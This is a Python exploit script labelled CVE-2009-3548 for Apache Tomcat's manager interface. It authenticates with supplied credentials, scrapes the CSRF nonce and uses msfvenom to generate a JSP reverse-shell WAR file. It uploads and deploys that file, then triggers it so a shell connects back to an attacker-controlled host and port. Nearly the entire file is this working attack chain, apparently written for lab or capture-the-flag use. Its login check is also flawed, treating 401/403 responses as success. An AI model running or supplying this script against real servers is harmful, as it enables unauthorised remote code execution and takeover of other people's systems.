import socket
import subprocess
import base64
import random
import requests
import lxml.html
import argparse
import string
import sys
from log_colors import *

# CVE-2009-3548
class CVE2009_3548:

    def __init__(self, host, port, path, usr, pswd):
        url = "http://" + host + ":" + port + "/" + path.strip('/')
        print (LogColors.BLUE + "victim: " + url + "..." + LogColors.ENDC)
        self.host, self.port = host, port
        self.usr, self.pswd = usr, pswd
        self.url = url
        self.session = requests.Session()
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0", 
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Cache-Control": "max-age=0",
            "Host" : self.host + ":" + self.port,
            "Connection" : "keep-alive",
            "DNT" : "1",
            "Origin" : "http://" + self.host + ":" + self.port,
            "Upgrade-Insecrure-Requests" : '1',
        }

    # login basic auth
    def login(self):
        print (LogColors.BLUE + "login: " + self.usr + ":" + self.pswd + "..." + LogColors.ENDC)
        try:
            r = self.session.get(
                self.url,
                auth = requests.auth.HTTPBasicAuth(self.usr, self.pswd),
                headers = self.headers
            )
            if r.status_code in (401, 403):
                print (LogColors.YELLOW + "successfully login..." + LogColors.ENDC)
            else:
                print (LogColors.RED + "login failed :(" + LogColors.ENDC)
                sys.exit()
        except Exception as e:
            print (LogColors.RED + "login failed :(" + LogColors.ENDC)
            sys.exit()

    # generate payload with reverse shell
    def generate_payload(self, lhost, lport):
        self.lhost, self.lport = lhost, lport
        print (LogColors.BLUE + "generate reverse shell payload..." + LogColors.ENDC)
        msfv = "msfvenom -p java/jsp_shell_reverse_tcp"
        msfv += " LHOST=" + lhost
        msfv += " LPORT=" + lport
        msfv += " -f war"
        msfv += " -o shell.war"
        print (LogColors.YELLOW + msfv + LogColors.ENDC)
        try:
            p = subprocess.Popen(msfv.split(), stdout = subprocess.PIPE)
            p.wait()
            print (LogColors.GREEN + "reverse shell payload successfully generated :)" + LogColors.ENDC)
        except Exception as e:
            print (LogColors.RED + "generate payload failed :(" + LogColors.ENDC)
    
    # get csrf token
    def get_csrf_token(self):
        csrf = None
        csrf_url = self.url + "/list"
        r = self.session.get(
            csrf_url, 
            auth = requests.auth.HTTPBasicAuth(self.usr, self.pswd),
            headers = self.headers)
        if r.ok:
            tree = lxml.html.fromstring(r.text)
            csrf = tree.xpath(".//a[contains(@href, '?org.apache.catalina.filters.CSRF_NONCE')]/@href")
            if csrf:
                csrf = csrf[0].split("CSRF_NONCE=")[-1]
                self.csrf = csrf
                print (LogColors.YELLOW + "csrf token: " + csrf + LogColors.ENDC)
            else:
                print (LogColors.RED + "csrf not found :(" + LogColors.ENDC)
        else:
            print (LogColors.RED + "csrf token not found :(" + LogColors.ENDC)
        return csrf

    # upload payload
    def upload_payload(self):
        upload_url = self.url + "/upload"
        upload_url += "?org.apache.catalina.filters.CSRF_NONCE=" + self.csrf
        boundary_id = ''.join(random.choice(string.digits) for i in range(28))
        ctype = 'multipart/form-data;' 
        ctype += 'boundary=---------------------------' + boundary_id
        self.headers["Content-Type"] = ctype
        with open("shell.war", "rb") as f:
            data = f.read()
            self.headers["Content-Length"] = str(len(data))
            print (LogColors.YELLOW + "uploading " + str(len(data)) + " bytes as payload..." + LogColors.ENDC)
            war = "---------------------------"
            war += boundary_id
            war += "\r\nContent-Disposition: form-data;"
            war += ' name="deployWar"; filename="shell.war"'
            war += '\r\nContent-Type: application/octet-stream\r\n\r\n'
            war += str(data)
            war += "\r\n-----------------------------"
            war += boundary_id
            war += "--\r\n"

            files = {"deployWar" : f}
            r = self.session.post(
                upload_url,
                auth = requests.auth.HTTPBasicAuth(self.usr, self.pswd),
                files = files,
                #data = war,
                headers = self.headers
            )
            if r.ok:
                print (LogColors.GREEN + "payload successfully upload :)" + LogColors.ENDC)
            else:
                print (LogColors.RED + "payload upload failed. code " + str(r.status_code) + " :(" + LogColors.ENDC)

    # activate your shell
    def activate_shell(self):
        r = self.session.get(
                "http://" + self.host + ":" + self.port + "/shell",
                auth = requests.auth.HTTPBasicAuth(self.usr, self.pswd),
                headers = self.headers
            )
        if r.ok:
            print (LogColors.GREEN + "successfully hacked :)" + LogColors.ENDC)
            print (LogColors.GREEN + "check your netcat on " + self.lhost + " " + self.lport + LogColors.ENDC)
        else:
            print (LogColors.RED + "error when activate shell :(" + LogColors.ENDC)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--target', required = True, help = "target ip/host")
    parser.add_argument('-p', '--port', required = True, default = "8080", help = "port with a shell")
    parser.add_argument('-d','--dir', required = True, help = "target uri path (/manager/html)")
    parser.add_argument('-u','--username', required = True, help = "tomcat username (tomcat)")
    parser.add_argument('-s','--password', required = True, help = "tomcat password (s3cret)")
    parser.add_argument('-lh','--lhost', required = True, help = "host for shell return")
    parser.add_argument('-lp','--lport', required = True, help = "port for shell return")
    args = vars(parser.parse_args())
    print (LogColors.GREEN + 'Usage: $python cve_2009_3548.py -t 10.10.10.3 -p 8080 -path /manager/html --username tomcat --password tomcat --lhost 10.10.14.12 --lport 4444' + LogColors.ENDC)
    host, port = args['target'], args['port']
    usr, pswd = args['username'], args['password']
    path = args['dir']
    lhost, lport = args['lhost'], args['lport']
    cve = CVE2009_3548(host, port, path, usr, pswd)
    cve.login()
    cve.get_csrf_token()
    cve.generate_payload(lhost, lport)
    cve.upload_payload()
    cve.activate_shell()


